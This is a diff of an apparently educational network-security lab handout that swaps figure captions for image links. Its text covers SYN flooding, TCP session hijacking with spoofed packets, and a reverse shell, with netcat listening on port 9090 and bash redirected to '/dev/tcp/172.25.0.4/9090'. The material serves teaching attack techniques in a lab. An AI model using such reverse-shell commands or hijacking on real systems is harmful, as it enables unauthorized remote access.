@@ -67,7 +67,7 @@ server
 SYN Flooding Attack
 =====
 
-**Figure 2: SYN Flooding Attack**
+![](media/tcpip1.png)
 
 SYN flood is a form of DoS attack in which attackers send many SYN requests to a victim’s TCP port, but the attackers have no intention to finish the 3-way handshake procedure.
 Attackers either use spoofed IP address or do not continue the procedure. Through this attack, attackers can flood the victim’s queue that is used for half-opened connections, i.e. the connections that has finished SYN, SYN-ACK, but has not yet gotten a final ACK back. When this queue is full, the victim cannot take any more connection. 
@@ -132,7 +132,8 @@ You will again use packet spoofing (nping) to perform this task. Use the –data
 
 Note that if you use your telnet session to delete that file, e.g., to observe the protocol in wireshark, then you must recreate that file so it can be deleted in a hijacked session.
 
-**Figure 3: TCP Session Hijacking Attack**
+![](media/tcpip2.png)
+
 
 Creating Reverse Shell using TCP Session Hijacking
 =====
@@ -144,13 +145,18 @@ running on a remote machine, connecting back to the attacker’s machine. This g
 
 In the following, we show how we can set up a reverse shell if we can directly run a command on the victim’s machine (i.e. the server machine). In the TCP session hijacking attack, attackers cannot directly run a command on the victim’s machine, so their job is to run a reverse-shell command through the session hijacking attack. In this task, students need to demonstrate that they can achieve this goal.
 
-**Figure 4: Reverse shell connection to the listening netcat process**
+![](media/tcpipA.png)
+(a) Use netcat to listen to connection
+
+![](media/tcpipB.png)
+(b) Run the reverse shell
+
 
 To have a bash shell on a remote machine connect back to the attacker’s machine, the attacker needs a process waiting for some connection on a given port. 
 
-In this example, we will use netcat. This program allows us to specify a port number and can listen for a connection on that port. In Figure 4(a), netcat (nc for short) is used to listen for a connection on port 9090. 
+In this example, we will use netcat. This program allows us to specify a port number and can listen for a connection on that port. In Figure (a), netcat (nc for short) is used to listen for a connection on port 9090. 
 
-In Figure 4(b), the /bin/bash command represents the command that would normally be executed on a compromised server.
+In Figure (b), the /bin/bash command represents the command that would normally be executed on a compromised server.
 
 This command has the following pieces:
 ```
@@ -159,10 +165,6 @@ This command has the following pieces:
  "> /dev/tcp/172.25.0.4/9090": This causes the output (stdout) of the shell to be redirected to the tcp connection to 172.25.0.4’s port 9090. The output stdout is represented by file descriptor number 1.
 
  "0<&1": File descriptor 0 represents the standard input (stdin). This causes the stdin for the shell to be obtained from the tcp connection.
-
-(a) Use netcat to listen to connection
-
-(b) Run the reverse shell
 
 "2>&1": File descriptor 2 represents standard error stderr. This causes the error output to be redirected to the tcp connection.
 ```
